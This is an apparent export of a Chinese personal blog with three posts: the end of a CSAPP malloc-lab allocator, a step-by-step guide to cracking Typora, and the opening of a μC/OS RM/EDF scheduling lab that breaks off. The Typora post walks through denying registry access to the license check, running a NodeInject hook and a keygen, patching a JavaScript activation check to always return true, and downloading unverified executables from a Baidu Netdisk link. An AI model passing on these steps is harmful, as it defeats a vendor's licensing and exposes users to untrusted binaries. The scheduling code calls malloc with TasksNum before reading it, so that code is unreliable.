    // 由于边界双字对齐的情况，最小的分配大小是DSIZE。头部4+尾部4+最小的内容为1-&gt;对齐边界后为16（CSAPP 课本练习题9.7）
    if (size &lt;= DSIZE)
        asize = 2 * DSIZE;
    else
        // 需要分配的大小+头部+尾部
        asize = ALIGN(size+DSIZE); // ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)
        // 课本：asize = DSIZE * ((size + (DSIZE) + (DSIZE - 1)) / DSIZE); 

    // 使用适配算法
    if ((bp = find_fit(asize)) != NULL)
    {
        place(bp, asize);
        return bp;
    }

    // 找不到合适的匹配就扩展
    extend_size = MAX(asize, CHUNKSIZE);
    if ((bp = extend_heap(extend_size / WSIZE)) == NULL)
    {
        return NULL;
    }
    place(bp, asize);
    return bp;
}



/*
 * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
 */
void *mm_realloc(void *ptr, size_t size)
{
    void *oldptr = ptr;
    void *newptr;
    size_t copySize;

    newptr = mm_malloc(size);
    if (newptr == NULL)
        return NULL;
    if (ptr == NULL)
    {
        return newptr;
    }

    copySize = GET_SIZE(HDRP(oldptr));
    if (size &lt; copySize)
        copySize = size;
    memcpy(newptr, oldptr, copySize);
    mm_free(oldptr);
    return newptr;
    // return NULL;
}

// 放置块（课本练习9.9）
static void place(void *bp,size_t asize){
    size_t free_block_size = GET_SIZE(HDRP(bp));

    // 空闲块减去需要分配的大小，得到的碎片必须至少能容纳一个最小的可分配的块（2*DSIZE，也就是头部4+尾部4+最小的内容为1-&gt;对齐边界后为16）
    if((free_block_size - asize)&gt;=2*DSIZE){
        // 裁剪
        PUT(HDRP(bp),PACK(asize,1));
        PUT(FTRP(bp),PACK(asize,1));
        bp = NEXT_BLKP(bp);
        PUT(HDRP(bp),PACK(free_block_size-asize,0));
        PUT(FTRP(bp),PACK(free_block_size-asize,0));
    }else{
        PUT(HDRP(bp),PACK(free_block_size,1));
        PUT(FTRP(bp),PACK(free_block_size,1));
    }

}

/***** 适配算法  ******/

static void *find_fit(size_t asize){
    // asize 预留了头部和脚部的大小
#ifdef NEXT_FIT
    return algo_next_fit(asize);
#else
    return algo_first_fit(asize);
#endif
}

// 首次匹配算法（课本练习9.8）
static void *algo_first_fit(size_t asize){
    void* bp =heap_listp;
    while(GET_SIZE(HDRP(bp))&gt;0){
        if(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize&lt;=GET_SIZE(HDRP(bp)))){
            return bp;
        }
        bp = NEXT_BLKP(bp);
    }
    return NULL;
}

// 下次适配算法
#ifdef NEXT_FIT
    static void* last_heap_listp = NULL; // 上次遍历的指针
    static void *algo_next_fit(size_t asize){
        void* bp;
        if(last_heap_listp!=NULL){
            bp =last_heap_listp;
        }else{
            bp =heap_listp;
        }
        
        while(GET_SIZE(HDRP(bp))&gt;0){
            if(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize&lt;=GET_SIZE(HDRP(bp)))){
                last_heap_listp=bp;
                return bp;
            }
            bp = NEXT_BLKP(bp);
        }
        last_heap_listp = NULL;

        // 从头再搜索一遍
        return algo_first_fit(asize);
    }
#endif

</code></pre>
<h1>后记</h1>
<p>这个实验，手打代码，bug 真多。真不能相信肉眼对照，只能信 CV 大法。</p>
<p>限于教学安排和本人时间，CSAPP LABS 就更新到这里。其实这些实验要基本完成也并不困难，在操作的同时可以学到许多 C 语言的知识，积累编程经验，对后续理解计算机都有帮助。</p>
<p>希望大家在知识的海洋里、在存储器山中收获满满！🥳🥳🥳</p>
<h1>本文参考</h1>
<ul>
<li>《CSAPP》第三版第九章内容</li>
<li><a href="https://zhuanlan.zhihu.com/p/672618494">CSAPP课程Lab6 Malloc Lab - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.jianshu.com/p/6e59fde0e6c0">CSAPP之详解MollocLab - 简书 (jianshu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1135491326" class="record">
            <header>
                <h1 class="record-title">Typora 免费版本 or 正式版的绿色使用</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('破解');">破解</button>
                    
                    <button class="btn" onclick="activeTag('Typora');">Typora</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/13/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240612221122.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>介绍继续使用 Typora 免费版或正式版的方法</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>43ae38fe</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>文章仅供参考学习。学生党可以先使用绿色软件过渡一下。有条件的话希望大家多多支持正版！</p>
</blockquote>
<p>两年前 Typora 开始收费时，我就一直使用 <em>进行了绿色手段的</em> 免费的开发版本。后来近些天更新 Win11 后（没错，终于被 Windows 更新提示烦到了），之前的绿色手段失效了，Typora 免费版本又不能用了，打算找找以前的备忘重新操作一下。</p>
<h1>Typora 的免费版本破解方法（注册表修改）</h1>
<blockquote>
<p>Typora 最后一个免费版本为 Typora-0.11.18。<strong>安装包详见文末链接</strong>，压缩包提供的是 0.11.17 版本。</p>
</blockquote>
<p>自从 Typora 更新至正式版本 1.0.0 后，Typora 开始收费。之前的 Beta 免费版本还能用一段时间，但是不久后发现免费版本也必须强制升级。</p>
<p>打开 Beta 版本的 Typora 后会提示官方早已埋好的正版验证：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20240612212136.webp" alt="QQ截图20240612212136.png|500"></p>
<p>并跳转到购买页。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20240612212154.webp" alt="QQ截图20240612212154.png|375"></p>
<p>目前网上主要方案有：</p>
<ul>
<li>重装版本。目测无效。</li>
<li>修改系统时间。可能无效且不实用。</li>
<li>使用网络脚本和安装包。麻烦且危险。</li>
</ul>
<p>这里介绍修改注册表的方法。</p>
<p>首先打开注册表编辑器，<kbd>Win</kbd>+<kbd>R</kbd>，输入 regedit。</p>
<blockquote>
<p>巧记：regedit -&gt; reg edit</p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240612215703.webp" alt="image.png|350"></p>
<p>进入路径计算机 <code>\HKEY_CURRENT_USER\SOFTWARE\Typora</code>。右键 Typora，修改 Administrators 的读取权限为拒绝。然后选择「应用」即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20240612212645.webp" alt="QQ截图20240612212645.png"></p>
<p>这时你就可以正常打开 Typora 的 Beta 版本了。别忘了把自动更新去掉：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240612220258.webp" alt="image.png"></p>
<blockquote>
<p>注册表修改之后，你可能就无法再次访问 Typora 这个注册表项了。但是你可以通过这篇文章进行恢复：<a href="https://blog.csdn.net/qq_37674858/article/details/107876060">Win10注册表无法保存对权限所作的更改拒绝访问_无法保存对waasmedicsvc权限的更改-CSDN博客</a></p>
</blockquote>
<h1>Typora 正式版破解方法</h1>
<p>这里介绍两种方法。</p>
<h2>方法 1：使用开源工具生成序列号</h2>
<blockquote>
<p>[!Hint] 自编译的一些提示</p>
<p>编译这个开源工具需要一些编译环境。安装 cargo：<a href="https://rustwiki.org/zh-CN/cargo/getting-started/installation.html">安装 - Cargo 手册 中文版 (rustwiki.org)</a>。在 Windows 下，它需要额外安装 Visual Studio 软件作为构建工具。Visual Studio 需要安装「基于桌面开发的 C++」工具包。<img src="https://cdn.gallery.uuanqin.top/img/20240613115942.webp" alt="image.png|300"></p>
<p>根据 <a href="https://github.com/DiamondHunters/NodeInject_Hook_example">文档</a> 对开源工具进行编译：</p>
<ol>
<li><code>git clone https://github.com/DiamondHunters/NodeInject.git</code></li>
<li>Replace <code>hooklog.js</code> with <code>hook.js</code> in this repo (or use <code>no_embed</code> feature and set <code>NO_EMBED_HOOK_JS_PATH</code> to the path of <code>hook.js</code>)</li>
<li>Run <code>cargo build</code> or <code>cargo build --features no_embed</code> to build a type of executable (If you enabled <code>no_embed</code> feature, you need to copy <code>hook.js</code> to the same directory of executable)</li>
<li>Run the executable</li>
</ol>
<p>但是目前自编译我没试成功，我使用了网上编译好的程序。</p>
</blockquote>
<p>首先前往 <a href="https://typoraio.cn/">官网</a> 安装正式版（这里以 1.8 版本为例）。然后下载本文文末的压缩包。</p>
<p>将压缩包中的 <code>node_inject.exe</code> 和 <code>license-gen.exe</code> 放在 Typora 安装目录中。在终端进入 Typora 安装目录，依次输入以下指令执行：</p>
<pre><code class="language-sh"># 自动配置相关文件
.\node_inject.exe
# 序列号生成
.\license-gen.exe
</code></pre>
<blockquote>
<p>给小白的提示：终端打开方式有</p>
<ol>
<li>Win+R，输入 cmd 打开终端。输入 <code>cd &lt;Typora安装路径&gt;</code> 进入文件夹。</li>
<li>如果安装有 Windows Terminal 可以直接打开使用。</li>
</ol>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240613114552.webp" alt="image.png"></p>
<p>将生成的序列号（比如上图的 <code>CXSQSB-X6W9HB-UL96GH-YVQS7T</code> ）输入到激活框中，邮件名称随便填：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240613115232.webp" alt="image.png|425"></p>
<blockquote>
<p>激活时如果报 Failed to write license to local machine. 我们可以把文章上一小节中的注册表 <code>\HKEY_CURRENT_USER\SOFTWARE\Typora</code> Administrators 的读取权限恢复一下，也就是取消勾选拒绝框。</p>
</blockquote>
<p>激活成功。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240613115249.webp" alt="image.png|400"></p>
<p>别忘了把自动更新取消勾选：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240612222351.webp" alt="image.png|525"></p>
<h2>方法 2：魔改原始文件法（障眼法）</h2>
<p>首先前往 <a href="https://typoraio.cn/">官网</a> 安装正式版（这里以 1.8 版本为例）。</p>
<p>安装成功后，在安装路径找到：<code>Typora\resources\page-dist\static\js\LicenseIndex.180dd4c7.c77b6991.chunk.js</code> 这个文件夹。</p>
<p>使用 VSCode 或记事本软件，使用 Ctrl+H「替换」以下内容：</p>
<ul>
<li>将 <code>e.hasActivated=&quot;true&quot;==e.hasActivated</code></li>
<li>替换为 <code>e.hasActivated=&quot;true&quot;==&quot;true&quot;</code></li>
</ul>
<p>软件激活完毕。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240612222254.webp" alt="image.png|500"></p>
<p>此时，每次打开 Typora 都会提示激活成功输入框，以及左下角显示未激活图标。下面将一步步解决。</p>
<p>首先是关闭软件每次启动时的已激活弹窗。在安装路径下 <code>resources\page-dist\license.html</code> 下替换：</p>
<ul>
<li>将 <code>&lt;/body&gt;&lt;/html&gt;</code></li>
<li>替换为：</li>
</ul>
<pre><code class="language-html">&lt;script&gt;window.onload=function(){setTimeout(()=&gt;{window.close();},5);};&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>然后是去除软件左下角“未激活”提示。找到 <code>resources\locales\zh-Hans.lproj\Panel.json</code></p>
<ul>
<li>将 <code>&quot;UNREGISTERED&quot;:&quot;未激活&quot;</code></li>
<li>替换为 <code>&quot;UNREGISTERED&quot;:&quot; &quot;</code></li>
</ul>
<p>但上面的操作都是障眼法，比如已激活弹窗在打开软件后有瞬间消失的影子、「未激活」小标签只是更名为一个空格而已。且存在小标签关闭后报错的问题。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240612224601.webp" alt="image.png|475"></p>
<p>激活成功后别忘了禁用自动更新。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240612222351.webp" alt="image.png|525"></p>
<h2>其他方法</h2>
<blockquote>
<p>以下方式供参考，未经成功实验。</p>
</blockquote>
<ul>
<li><code>winmm.dll</code> 方法。<a href="https://github.com/markyin0707/typora-activation">markyin0707/typora-activation: Typora最新的激活破解方案，三步即激活。 😊实时更新中/👩‍🎓学生党必备，有条件支持正版的请不要点开🔞🈲️。Activate Typora (github.com)</a>1.8 版本不可用，必须使用文档说明的版本。</li>
</ul>
<h1>资源链接</h1>
<blockquote>
<p>[!warning] 声明：资源文件来源于网络，请下载者自行鉴别软件安全性！</p>
</blockquote>
<p>百度网盘打开：</p>
<ul>
<li>链接：<a href="https://pan.baidu.com/s/1elxBPdoy4t9DkeA3WtE4MA?pwd=hbks">https://pan.baidu.com/s/1elxBPdoy4t9DkeA3WtE4MA?pwd=hbks</a></li>
<li>提取码：hbks</li>
</ul>
<h1>后记</h1>
<p>自从换上了 Obsidian 后，Typora 就用得特别少了。与 Obsidian 相比，Typora 功能更加专注，可以快速打开和编辑 Markdown 文件，这也是我 2 年来还在保留它的原因。</p>
<p>Typora 可以进一步优化使用提升体验：</p>
<ul>
<li>开始菜单栏右键菜单中新建「Markdown」文件</li>
<li>Typora 集成图床：<a href="#377267818" title="Typora 应用 PicGo(app) 使用图床" class="record-link ">Typora 应用 PicGo(app) 使用图床</a></li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/u012948161/article/details/125370209">Typora Beta版过期解决_typora注册表删除-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/xiaoniuhululu/p/16660617.html">Typora 最后免费版本也不能用了？简单一招搞定 - 小牛呼噜噜 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/qjkewdmgkq/article/details/139335063">破解/激活 Typora 2024 教程_typora激活-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/weixin_47287782/article/details/133639804">关于Typora购买license后在Windows上激活时频繁出错的问题_typora failed to write listence-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/QQ727338622/article/details/136637921">记录一个Typora激活方法(附软件)！！！-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_37674858/article/details/107876060">Win10注册表无法保存对权限所作的更改拒绝访问_无法保存对waasmedicsvc权限的更改-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/676158034">Typora激活最全指南（2024年最新版） - 知乎 (zhihu.com)</a></li>
<li><a href="https://github.com/DiamondHunters/NodeInject_Hook_example">DiamondHunters/NodeInject_Hook_example: A hooking example for NodeInject (github.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="377267818">
                            <a href="#377267818">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Typora 应用 PicGo(app) 使用图床</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>开始菜单栏右键菜单中新建「Markdown」文件</li>
<li>Typora 集成图床：<a href="#377267818" title="Typora 应用 PicGo(app) 使用图床" class="record-link highlight">Typora 应用 PicGo(app) 使用图床</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="2982342308" class="record">
            <header>
                <h1 class="record-title">RM 和 EDF 任务调度算法在 μCOSII 上的实现</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('μCOS');">μCOS</button>
                    
                    <button class="btn" onclick="activeTag('RM');">RM</button>
                    
                    <button class="btn" onclick="activeTag('EDF');">EDF</button>
                    
                    <button class="btn" onclick="activeTag('实时系统');">实时系统</button>
                    
                    <button class="btn" onclick="activeTag('任务管理');">任务管理</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/22/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240622164030.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>实时操作系统实验 2</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b1c2eea4</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>文章写作背景为《实时系统设计》课程实验二。写这篇东西掉了好多头发🤬。</p>
</blockquote>
<p>源码在文章后。</p>
<h1>实验介绍</h1>
<p>实验目的：</p>
<ol>
<li>熟悉嵌入式实时操作系统 μC/OS 代码结构。</li>
<li>理解、设计和实现 RM 和 EDF 等算法，调研相关技术。</li>
<li>在 μC/OS 上使用 VC 运行和调试设计的程序。</li>
</ol>
<p>实验环境：</p>
<ol>
<li>操作系统：μC/OS-II</li>
<li>软件：Microsoft Visual C++ 6.0</li>
</ol>
<p>实验原理：</p>
<ol>
<li>RM 算法。RM(Rate Monotonic) 算法根据周期任务的释放频率，即周期的长短来分配任务的优先级，周期越短的任务优先级越高。当 Di=Ti 时，RM 算法是最优的固定优先级调度算法。如有两个实时任务τA（TA=25，CA=10）、τB（TB=40，CB=10）和τC（TC=100，CC=20），采用 RM 算法调度如下图所示：</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240621132520.webp" alt="image.png"></p>
<ol start="2">
<li>EDF 算法的实现。EDF(Earliest Deadline First) 算法按照实时任务的绝对截止时间来分配优先级，截止时间越近的优先级越高。EDF 算法是最优的动态优先级调度算法。如有两个实时任务τ1（C1=1，D1=3,T1=4）和τ2（C2=2,D2=4,T2=6），采用 EDF 算法调度如下图所示：</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240621132534.webp" alt="image.png"></p>
<h1>步骤</h1>
<h2>基本认识</h2>
<p>熟读课件和相关源码片段，我们有以下基本认识：</p>
<ul>
<li>任务在 <code>main.c</code> 中创建，新建任务后会生成对应的 TCB 程序控制块（定义在 <code>ucos-ii.h</code> 中的 OS_TCB），并链接到 TCB 链表头中，链表尾是程序创建的空闲任务。</li>
<li>实验程序我们需要手动模拟时间中断，以触发 <code>OSTimeTick()</code></li>
<li><code>OSTimeTick()</code> 会遍历任务链表，检查它们的延时。</li>
<li><code>OS_SchedNew()</code> 是用来设定最高优先级的。默认实现是找就绪组就绪表。我们可以在里面动手脚，直接写我们的调度算法。</li>
<li><code>OSTimeTick()</code> 调用 <code>OSIntExit()</code>，<code>OSIntExit()</code> 中又 <code>OS_SchedNew()</code>。所以每一次 <code>OSTimeTick()</code> 到来时，都有机会判断当前最高优先级的任务是什么。</li>
</ul>
<h2>为 TCB 块添加扩展</h2>
<p>无论是 RM 算法还是 EDF 算法，都需要使用扩展的 TCB 块存储任务优先级数据。统一的扩展数据结构为不同算法的实现方式进行简化。</p>
<pre><code class="language-c">// ucos_ii.h
typedef struct tcb_ext_info{
	INT32U c;      // 保存C
	INT32U t;      // 保存T 周期
	INT32U d;      // 保存D 截止时间（EDF算法）
	INT32U rest_c; // 保存剩余工作时间
	INT32U rest_t; // 保存周期内剩余的事件
	INT32U rest_d; // 保存当前时间与截至时间的差值（EDF算法）
	INT32U task_id;// 任务ID
	INT8U is_pend; // 判断任务是否挂起（需要手动设置的标记位）
} tcb_ext_info;
</code></pre>
<h2>任务创建</h2>
<p>main 函数中首先要求输入一个任务数量 <code>TasksNum</code>，根据 <code>TasksNum</code> 进行迭代，持续获取每个任务的基本信息：</p>
<ol>
<li>C 计算时间</li>
<li>T 周期</li>
<li>D 截止时间（EDF 算法）</li>
</ol>
<p>并对其余记录进行填充：</p>
<ol>
<li>剩余计算时间</li>
<li>周期内剩余时间</li>
<li>剩余截止时间（EDF 算法）</li>
<li>任务 id</li>
<li>初始化 <code>is_pend</code> 为 0</li>
</ol>
<p><code>timeSetEvent</code> 将模拟时钟中断。</p>
<p>宏 <code>LAB2_EDF</code> 决定当前使用的是 EDF 算法还是 RM 算法。</p>
<pre><code class="language-c">int main(int argc, char **argv)
{
	int TasksNum,i,C,T;
#ifdef LAB2_EDF
	int D;
#endif

	tcb_ext_info* task_info_array = (tcb_ext_info*)malloc(sizeof(tcb_ext_info)*TasksNum);

	VCInit();

	// 输入提示
#ifdef LAB2_EDF
    printf(&quot;EDF算法实验。请输入任务数：\n&quot;);
#else
	printf(&quot;RM 算法实验。请输入任务数：\n&quot;);
#endif

	scanf(&quot;%d&quot;,&amp;TasksNum);
    if (TasksNum&lt;0)
	{
		printf(&quot;无效的输入!&quot;);
        return(1); 	
	}
	OSInit();
	
	for(i=0;i&lt;TasksNum;i++){
#ifdef LAB2_EDF
		// EDF 每个任务三个参数
		scanf(&quot;%d %d %d&quot;,&amp;C,&amp;D,&amp;T);
#else
		// RM 每个任务两个参数
		scanf(&quot;%d %d&quot;,&amp;C,&amp;T);
#endif
		
		task_info_array[i].c = C;
		task_info_array[i].t = T;

		task_info_array[i].rest_c = C;
		task_info_array[i].rest_t = T;

		task_info_array[i].task_id = i;
		task_info_array[i].is_pend = 0;  // 初始为不挂起

#ifdef LAB2_EDF
		task_info_array[i].d = D;
		task_info_array[i].rest_d = D;
#endif
			
		OSTaskCreateExt(
			FirstTask, 
			0, 
			&amp;TaskStk[i+5][TASK_STK_SIZE-1], 
			i+5,  //设置互不冲突的数即可
			i,  // 任务ID
